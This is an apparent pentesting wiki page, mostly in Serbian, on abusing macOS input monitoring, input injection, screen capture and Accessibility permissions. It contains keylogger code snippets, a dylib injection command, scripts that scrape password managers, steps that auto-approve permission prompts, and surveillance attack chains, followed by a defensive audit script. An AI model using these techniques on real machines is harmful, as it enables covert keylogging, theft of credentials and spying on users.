# macOS Praćenje ulaza, snimanje ekrana i zloupotreba Accessibility

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Tri povezana TCC servisa kontrolišu kako aplikacije mogu da posmatraju i interaguju sa sesijom korisnikovog desktopa:

| TCC Service | Dozvola | Mogućnost |
|---|---|---|
| `kTCCServiceListenEvent` | **Praćenje ulaza** | Čitanje svih događaja sa tastature i miša širom sistema (keylogging) |
| `kTCCServicePostEvent` | **Injekcija ulaza** | Ubacivanje sintetičkih događaja tastature i miša |
| `kTCCServiceScreenCapture` | **Snimanje ekrana** | Čitanje bafera prikaza, pravljenje snimaka ekrana, snimanje ekrana |
| `kTCCServiceAccessibility` | **Accessibility** | Kontrola drugih aplikacija preko AXUIElement API, čitanje UI elemenata |

Ove dozvole su **najopasnija kombinacija** na macOS — zajedno omogućavaju:
- Potpuno keylogging svakog pritiska tastera (lozinke, poruke, brojevi kreditnih kartica)
- Snimanje ekrana celog vidljivog sadržaja
- Sintetičko ubacivanje ulaza (klik na dugmad, odobravanje dijaloga)
- Potpunu kontrolu GUI-a ekvivalentnu fizičkom pristupu

---

## Praćenje ulaza (kTCCServiceListenEvent)

### Kako radi

macOS koristi **`CGEventTap` API** da omogući procesima da presretnu događaje ulaza iz Quartz event sistema. Proces sa ListenEvent dozvolom može kreirati event tap koji prima **svaki događaj sa tastature i miša** pre ili posle nego što stignu do ciljne aplikacije.
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Pronalaženje binarnih fajlova sa pravima (entitlements)
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging via Code Injection

Ako binarni fajl sa ListenEvent permission takođe ima **disabled library validation** ili **allows DYLD environment variables**, napadač može ubaciti dylib koji registruje CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Injektovana dylib nasleđuje ListenEvent TCC grant cilja i presreće sve pritiske tastera.

### Attack: Credential Harvesting

Sofisticirani keylogger može da poveže pritiske tastera sa aktivnom aplikacijom:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### Kako funkcioniše

PostEvent permission omogućava kreiranje event tap-a sa **`kCGEventTapOptionDefault`** (can modify/inject events) umesto ListenOnly. Ovo omogućava:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Napad: Automated TCC Prompt Approval

Uz PostEvent, napadač može **simulirati klik na "Allow"** na TCC dijalozima za dozvole:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Snimanje ekrana (kTCCServiceScreenCapture)

### Kako funkcioniše

Dozvola za snimanje ekrana omogućava čitanje bafera prikaza koristeći:
- **`CGWindowListCreateImage`** — snimiti bilo koji prozor ili ceo ekran
- **`ScreenCaptureKit`** (macOS 12.3+) — moderan API za strimovanje sadržaja ekrana
- **`CGDisplayStream`** — hardverom ubrzano snimanje ekrana
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Pronalaženje klijenata za snimanje ekrana
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

Umetnuti proces snimanja ekrana može periodično da uhvati frejmove i koristi OCR za izdvajanje lozinki:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Počevši od **macOS Sonoma**, snimanje ekrana prikazuje **trajni indikator** na traci menija. Na starijim verzijama, snimanje ekrana je moglo biti potpuno tiho. Međutim, kratko snimanje od jednog kadra i dalje može ostati nezapaženo od strane korisnika.

### Napad: Snimanje sesije

Kontinuirano snimanje ekrana omogućava potpunu reprodukciju korisničke sesije:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accessibility (kTCCServiceAccessibility)

### Kako funkcioniše

Pristup Accessibility omogućava kontrolu nad drugim aplikacijama preko **AXUIElement API**. Proces sa Accessibility pristupom može:

1. **Čitati** bilo koji element korisničkog interfejsa u bilo kojoj aplikaciji (tekstualna polja, oznake, dugmad, meniji)
2. **Kliknuti** dugmad i interagovati sa kontrolama
3. **Kucati** tekst u bilo koje tekstualno polje
4. **Kretati se** kroz menije i dijaloge
5. **Izvlačiti** prikazane podatke iz bilo koje pokrenute aplikacije
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Napad: Self-Granting TCC Permissions

Najopasnija zloupotreba Accessibility je **navigacija System Settings da biste svojem malveru dodelili dodatna dopuštenja**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Napad: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Napad: Automatizovane korisničke akcije
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Lanci napada

### Lanac: Input Monitoring + Screen Capture = Potpuni nadzor
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Lanac: Accessibility + PostEvent = Potpuna kontrola na daljinu
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Lanac: Accessibility → Self-Grant Camera/Mic → Surveillance
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Detekcija i enumeracija
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Izvori

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Zloupotreba Accessibility kao TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
